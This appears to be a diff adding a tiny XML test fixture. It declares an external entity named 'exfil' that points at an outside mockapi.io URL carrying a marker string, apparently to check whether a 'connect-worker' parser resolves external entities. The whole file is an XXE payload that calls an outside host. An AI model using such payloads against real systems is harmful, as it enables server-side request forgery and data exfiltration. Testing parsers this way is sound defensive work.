@@ -1,0 +1,5 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE r [
+  <!ENTITY exfil SYSTEM "https://68a59bcd2a3deed2960e186d.mockapi.io/emptyforpost?data=hello-Im-from-connect-worker">
+]>
+<r>&exfil;</r>
